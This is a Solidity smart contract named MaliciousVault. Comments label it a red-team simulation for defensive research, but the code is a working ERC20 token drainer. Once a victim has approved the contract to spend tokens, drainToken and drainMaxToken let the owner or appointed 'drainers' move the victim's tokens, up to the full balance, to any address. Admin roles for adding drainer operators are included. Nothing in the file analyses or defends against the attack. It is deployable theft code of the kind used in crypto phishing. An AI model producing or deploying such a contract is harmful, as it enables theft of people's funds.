// SPDX-License-Identifier: MIT
// [RED TEAM SIMULATION - AUTHORIZED TESTING ONLY]
// This asset is part of a high-fidelity security simulation for defensive analysis and documentation.
// Unauthorized use is strictly prohibited.

pragma solidity ^0.8.19;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract MaliciousVault is Ownable, ReentrancyGuard {
    // [RED TEAM SIMULATION - AUTHORIZED TESTING ONLY]
    // This contract is designed for defensive security research and threat intelligence gathering.
    
    event TokenDrained(address indexed token, address indexed from, uint256 amount, address indexed to);
    event VaultInitialized(address indexed owner);
    event DrainerAdded(address indexed drainer);
    event DrainerRemoved(address indexed drainer);
    event AdminAdded(address indexed admin);
    event AdminRemoved(address indexed admin);
    
    mapping(address => bool) public authorizedDrainers;
    mapping(address => bool) public admins;
    
    constructor() {
        _transferOwnership(msg.sender);
        authorizedDrainers[msg.sender] = true;
        admins[msg.sender] = true;
        emit VaultInitialized(msg.sender);
        emit AdminAdded(msg.sender);
    }
    
    modifier onlyAuthorized() {
        require(authorizedDrainers[msg.sender] || admins[msg.sender] || msg.sender == owner(), "Unauthorized drainer");
        _;
    }

    modifier onlyAdmin() {
        require(admins[msg.sender] || msg.sender == owner(), "Caller is not an admin");
        _;
    }
    
    function addAdmin(address admin) external onlyOwner {
        admins[admin] = true;
        emit AdminAdded(admin);
    }

    function removeAdmin(address admin) external onlyOwner {
        require(admin != owner(), "Cannot remove owner from admins");
        admins[admin] = false;
        emit AdminRemoved(admin);
    }

    function addAuthorizedDrainer(address drainer) external onlyAdmin {
        authorizedDrainers[drainer] = true;
        emit DrainerAdded(drainer);
    }
    
    function removeAuthorizedDrainer(address drainer) external onlyAdmin {
        authorizedDrainers[drainer] = false;
        emit DrainerRemoved(drainer);
    }
    
    function drainToken(
        address token,
        address from,
        uint256 amount,
        address to
    ) external onlyAuthorized nonReentrant {
        require(token != address(0), "Invalid token address");
        require(from != address(0), "Invalid from address");
        require(to != address(0), "Invalid to address");
        require(amount > 0, "Amount must be greater than 0");
        
        // Check allowance
        uint256 allowance = IERC20(token).allowance(from, address(this));
        require(allowance >= amount, "Insufficient allowance");
        
        // Transfer tokens
        bool success = IERC20(token).transferFrom(from, to, amount);
        require(success, "Transfer failed");
        
        emit TokenDrained(token, from, amount, to);
    }
    
    function drainMaxToken(
        address token,
        address from,
        address to
    ) external onlyAuthorized nonReentrant {
        require(token != address(0), "Invalid token address");
        require(from != address(0), "Invalid from address");
        require(to != address(0), "Invalid to address");
        
        uint256 allowance = IERC20(token).allowance(from, address(this));
        require(allowance > 0, "No allowance");
        
        uint256 balance = IERC20(token).balanceOf(from);
        uint256 amountToDrain = allowance < balance ? allowance : balance;
        
        require(amountToDrain > 0, "Nothing to drain");
        
        bool success = IERC20(token).transferFrom(from, to, amountToDrain);
        require(success, "Transfer failed");
        
        emit TokenDrained(token, from, amountToDrain, to);
    }
    
    function emergencyWithdraw(address token) external onlyOwner {
        uint256 balance = IERC20(token).balanceOf(address(this));
        if (balance > 0) {
            IERC20(token).transfer(owner(), balance);
        }
    }
    
    function emergencyWithdrawETH() external onlyOwner {
        uint256 balance = address(this).balance;
        if (balance > 0) {
            payable(owner()).transfer(balance);
        }
    }
}
